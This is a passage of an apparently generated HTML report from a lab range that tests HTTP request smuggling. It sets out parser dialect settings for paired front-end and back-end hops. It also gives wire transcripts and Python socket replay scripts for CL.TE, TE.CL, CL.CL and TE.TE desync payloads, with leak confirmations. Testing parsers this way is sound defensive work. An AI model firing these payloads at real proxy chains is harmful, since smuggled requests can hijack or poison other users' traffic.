+Content-Length: 96\r\n
+\r\n
+
+# --- open a NEW connection and send ---
+POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n
+Host: trigger\r\n
+Content-Length: 18\r\n
+\r\n
+VVVVVVVVVVVVVVVVVV</pre><h5>Python replay</h5><pre>import socket, time
+HOST, PORT = &#x27;TARGET&#x27;, int(&#x27;PORT&#x27;)
+
+poison = (
+    b&#x27;POST /__lab/noop HTTP/1.1\r\n&#x27;
+    b&#x27;Host: attacker\r\n&#x27;
+    b&#x27;Content-Length: 84\r\n&#x27;
+    b&#x27;Transfer-Encoding: chunked\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;0\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;GET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: smuggled\r\n&#x27;
+    b&#x27;Content-Length: 96\r\n&#x27;
+    b&#x27;\r\n&#x27;
+)
+
+s = socket.create_connection((HOST, PORT), timeout=3)
+s.sendall(poison)
+time.sleep(0.1)
+s.close()          # close the attacker connection first
+
+# Now a fresh connection; the hidden request executes for it if the
+# two hops disagreed about where the poison&#x27;s body ended:
+t = socket.create_connection((HOST, PORT), timeout=3)
+trigger = (
+    b&#x27;POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: trigger\r\n&#x27;
+    b&#x27;Content-Length: 18\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;VVVVVVVVVVVVVVVVVV&#x27;
+)
+t.sendall(trigger)
+print(t.recv(65535))
+t.close()
+</pre></details><div class="shape-row clean"><span class="shape-name">TE.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row vuln"><span class="shape-name">CL.CL</span><span class="shape-verdict">confirmed — leaked in 3/3 trials (confidence 100%)</span></div><p class='why'>The first Content-Length is large and the second small (or vice versa). A first-wins hop and a last-wins hop disagree by the difference, leaving a request&#x27;s worth of bytes in the stream.</p><div class="evidence"><div class="ev-label">trigger response on the fresh connection (leaks the hidden marker):</div><pre>ECHO h5872a30f7fb8</pre></div><details class="sample"><summary>Reproduce: <code>cl_cl</code></summary><p>The first Content-Length is large and the second small (or vice versa). A first-wins hop and a last-wins hop disagree by the difference, leaving a request&#x27;s worth of bytes in the stream.</p><h5>Wire transcript (\r\n shown literally)</h5><pre>POST /__lab/noop HTTP/1.1\r\n
+Host: attacker\r\n
+Content-Length: 87\r\n
+Content-Length: 8\r\n
+\r\n
+QQQQQQQQGET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n
+Host: smuggled\r\n
+Content-Length: 96\r\n
+\r\n
+
+# --- open a NEW connection and send ---
+POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n
+Host: trigger\r\n
+Content-Length: 18\r\n
+\r\n
+VVVVVVVVVVVVVVVVVV</pre><h5>Python replay</h5><pre>import socket, time
+HOST, PORT = &#x27;TARGET&#x27;, int(&#x27;PORT&#x27;)
+
+poison = (
+    b&#x27;POST /__lab/noop HTTP/1.1\r\n&#x27;
+    b&#x27;Host: attacker\r\n&#x27;
+    b&#x27;Content-Length: 87\r\n&#x27;
+    b&#x27;Content-Length: 8\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;QQQQQQQQGET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: smuggled\r\n&#x27;
+    b&#x27;Content-Length: 96\r\n&#x27;
+    b&#x27;\r\n&#x27;
+)
+
+s = socket.create_connection((HOST, PORT), timeout=3)
+s.sendall(poison)
+time.sleep(0.1)
+s.close()          # close the attacker connection first
+
+# Now a fresh connection; the hidden request executes for it if the
+# two hops disagreed about where the poison&#x27;s body ended:
+t = socket.create_connection((HOST, PORT), timeout=3)
+trigger = (
+    b&#x27;POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: trigger\r\n&#x27;
+    b&#x27;Content-Length: 18\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;VVVVVVVVVVVVVVVVVV&#x27;
+)
+t.sendall(trigger)
+print(t.recv(65535))
+t.close()
+</pre></details><div class="shape-row clean"><span class="shape-name">TE.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="vuln"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>back end also framed: /__lab/echo/B88da4607bba5</td></tr><tr class="clean"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="vuln"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>back end also framed: /__lab/echo/Bb46bd4db61f8</td></tr><tr class="vuln"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>back end also framed: /__lab/echo/Bde4a6a245969</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div><div id="te-cl-desync">
+    <section class="card">
+      <header class="card-head">
+        <h3>Proxy decodes chunked, origin obeys Content-Length</h3>
+        <span class="badge bad">1 wire shape(s), 1 template(s) desync</span>
+      </header>
+      <p class="story">An apache-style proxy decodes the chunked body and forwards it, but the Node-style origin obeys the smaller Content-Length, stops mid-chunk and parses the remainder as a request: classic TE.CL.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">apache</div><p>mod_proxy: tolerates whitespace before the colon, keeps duplicate Content-Length (first wins), and forwards the original header block.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>True</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>True</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>False</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>first</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">node-origin</div><p>Node-style origin: prefers Content-Length over Transfer-Encoding when both are present (the historical Node.js rule), first duplicate CL wins, and strips whitespace before &#x27;:&#x27; when it reposts.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>True</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>cl_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>first</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row clean"><span class="shape-name">CL.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row vuln"><span class="shape-name">TE.CL</span><span class="shape-verdict">confirmed — leaked in 3/3 trials (confidence 100%)</span></div><p class='why'>The front end decodes the chunked body; the origin obeys the shorter Content-Length, stops inside the chunk framing, and parses the rest as a new request.</p><div class="evidence"><div class="ev-label">trigger response on the fresh connection (leaks the hidden marker):</div><pre>ECHO hb93efe16ac7c</pre></div><details class="sample"><summary>Reproduce: <code>te_cl</code></summary><p>The front end decodes the chunked body; the origin obeys the shorter Content-Length, stops inside the chunk framing, and parses the rest as a new request.</p><h5>Wire transcript (\r\n shown literally)</h5><pre>POST /__lab/noop HTTP/1.1\r\n
+Host: attacker\r\n
+Content-Length: 4\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+4f\r\n
+GET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n
+Host: smuggled\r\n
+Content-Length: 96\r\n
+\r\n
+\r\n
+0\r\n
+\r\n
+
+# --- open a NEW connection and send ---
+POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n
+Host: trigger\r\n
+Content-Length: 18\r\n
+\r\n
+VVVVVVVVVVVVVVVVVV</pre><h5>Python replay</h5><pre>import socket, time
+HOST, PORT = &#x27;TARGET&#x27;, int(&#x27;PORT&#x27;)
+
+poison = (
+    b&#x27;POST /__lab/noop HTTP/1.1\r\n&#x27;
+    b&#x27;Host: attacker\r\n&#x27;
+    b&#x27;Content-Length: 4\r\n&#x27;
+    b&#x27;Transfer-Encoding: chunked\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;4f\r\n&#x27;
+    b&#x27;GET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: smuggled\r\n&#x27;
+    b&#x27;Content-Length: 96\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;0\r\n&#x27;
+    b&#x27;\r\n&#x27;
+)
+
+s = socket.create_connection((HOST, PORT), timeout=3)
+s.sendall(poison)
+time.sleep(0.1)
+s.close()          # close the attacker connection first
+
+# Now a fresh connection; the hidden request executes for it if the
+# two hops disagreed about where the poison&#x27;s body ended:
+t = socket.create_connection((HOST, PORT), timeout=3)
+trigger = (
+    b&#x27;POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: trigger\r\n&#x27;
+    b&#x27;Content-Length: 18\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;VVVVVVVVVVVVVVVVVV&#x27;
+)
+t.sendall(trigger)
+print(t.recv(65535))
+t.close()
+</pre></details><div class="shape-row clean"><span class="shape-name">CL.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="clean"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>both hops framed the same boundaries</td></tr><tr class="vuln"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>back end also framed: /__lab/echo/B657f9581d8a3</td></tr><tr class="clean"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div><div id="cl-cl-desync">
+    <section class="card">
+      <header class="card-head">
+        <h3>First-wins front end, last-wins origin, on duplicate CL</h3>
+        <span class="badge bad">1 wire shape(s), 1 template(s) desync</span>
+      </header>
+      <p class="story">Both hops honour duplicate Content-Length but pick opposite values, so the body boundary shifts by the difference: CL.CL. Paired with a Python-style origin to keep the CL.CL signal isolated.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">legacy-lb</div><p>Load balancer that obeys Content-Length when both framing headers are present, keeps the first duplicate CL, and forwards verbatim.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>True</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>cl_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>first</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">python-origin</div><p>Back end built on the firewall&#x27;s own parser: strict RFC framing, rejects TE+CL, last duplicate CL wins.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>reject</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>last</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row clean"><span class="shape-name">CL.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row vuln"><span class="shape-name">CL.CL</span><span class="shape-verdict">confirmed — leaked in 3/3 trials (confidence 100%)</span></div><p class='why'>The first Content-Length is large and the second small (or vice versa). A first-wins hop and a last-wins hop disagree by the difference, leaving a request&#x27;s worth of bytes in the stream.</p><div class="evidence"><div class="ev-label">trigger response on the fresh connection (leaks the hidden marker):</div><pre>ECHO h133ab0f617a0</pre></div><details class="sample"><summary>Reproduce: <code>cl_cl</code></summary><p>The first Content-Length is large and the second small (or vice versa). A first-wins hop and a last-wins hop disagree by the difference, leaving a request&#x27;s worth of bytes in the stream.</p><h5>Wire transcript (\r\n shown literally)</h5><pre>POST /__lab/noop HTTP/1.1\r\n
+Host: attacker\r\n
+Content-Length: 87\r\n
+Content-Length: 8\r\n
+\r\n
+QQQQQQQQGET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n
+Host: smuggled\r\n
+Content-Length: 96\r\n
+\r\n
+
+# --- open a NEW connection and send ---
+POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n
+Host: trigger\r\n
+Content-Length: 18\r\n
+\r\n
+VVVVVVVVVVVVVVVVVV</pre><h5>Python replay</h5><pre>import socket, time
+HOST, PORT = &#x27;TARGET&#x27;, int(&#x27;PORT&#x27;)
+
+poison = (
+    b&#x27;POST /__lab/noop HTTP/1.1\r\n&#x27;
+    b&#x27;Host: attacker\r\n&#x27;
+    b&#x27;Content-Length: 87\r\n&#x27;
+    b&#x27;Content-Length: 8\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;QQQQQQQQGET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: smuggled\r\n&#x27;
+    b&#x27;Content-Length: 96\r\n&#x27;
+    b&#x27;\r\n&#x27;
+)
+
+s = socket.create_connection((HOST, PORT), timeout=3)
+s.sendall(poison)
+time.sleep(0.1)
+s.close()          # close the attacker connection first
+
+# Now a fresh connection; the hidden request executes for it if the
+# two hops disagreed about where the poison&#x27;s body ended:
+t = socket.create_connection((HOST, PORT), timeout=3)
+trigger = (
+    b&#x27;POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n&#x27;
+    b&#x27;Host: trigger\r\n&#x27;
+    b&#x27;Content-Length: 18\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;VVVVVVVVVVVVVVVVVV&#x27;
+)
+t.sendall(trigger)
+print(t.recv(65535))
+t.close()
+</pre></details><div class="shape-row clean"><span class="shape-name">TE.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="clean"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>both hops framed the same boundaries</td></tr><tr class="vuln"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>back end also framed: /__lab/echo/B49f05a681e15</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div><div id="te-te-desync">
+    <section class="card">
+      <header class="card-head">
+        <h3>Origin falls back to Content-Length on an unusable TE list</h3>
+        <span class="badge bad">1 wire shape(s), 2 template(s) desync</span>
+      </header>
+      <p class="story">The front end cannot use the Transfer-Encoding list and quietly falls back to Content-Length; the origin reads only the first TE header and decodes chunked. The two disagree on where the body ends: TE.TE.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">te-fallback</div><p>When Transfer-Encoding is present but unusable, falls back to Content-Length instead of rejecting the message.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>True</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>last</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">te-first-only</div><p>Reads only the first Transfer-Encoding header and ignores any that follow.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>ignore</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>True</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>last</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row clean"><span class="shape-name">CL.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">CL.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row vuln"><span class="shape-name">TE.TE</span><span class="shape-verdict">confirmed — leaked in 3/3 trials (confidence 100%)</span></div><p class='why'>A hop that cannot use the Transfer-Encoding list falls back to Content-Length; a hop that reads the first TE header decodes it. The two disagree on where the body ends.</p><div class="evidence"><div class="ev-label">trigger response on the fresh connection (leaks the hidden marker):</div><pre>ECHO h86031630d992</pre></div><details class="sample"><summary>Reproduce: <code>te_te</code></summary><p>A hop that cannot use the Transfer-Encoding list falls back to Content-Length; a hop that reads the first TE header decodes it. The two disagree on where the body ends.</p><h5>Wire transcript (\r\n shown literally)</h5><pre>POST /__lab/noop HTTP/1.1\r\n
+Host: attacker\r\n
+Content-Length: 84\r\n
+Transfer-Encoding: chunked\r\n
+Transfer-Encoding: x\r\n
+\r\n
+0\r\n
+\r\n
+GET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n
+Host: smuggled\r\n
+Content-Length: 96\r\n
+\r\n
+
+# --- open a NEW connection and send ---
+POST /__lab/echo/TRIGGER_MARKER HTTP/1.1\r\n
+Host: trigger\r\n
+Content-Length: 18\r\n
+\r\n
+VVVVVVVVVVVVVVVVVV</pre><h5>Python replay</h5><pre>import socket, time
+HOST, PORT = &#x27;TARGET&#x27;, int(&#x27;PORT&#x27;)
+
+poison = (
+    b&#x27;POST /__lab/noop HTTP/1.1\r\n&#x27;
+    b&#x27;Host: attacker\r\n&#x27;
+    b&#x27;Content-Length: 84\r\n&#x27;
+    b&#x27;Transfer-Encoding: chunked\r\n&#x27;
+    b&#x27;Transfer-Encoding: x\r\n&#x27;
+    b&#x27;\r\n&#x27;
+    b&#x27;0\r\n&#x27;
+    b&#x27;\r\n&#x27;
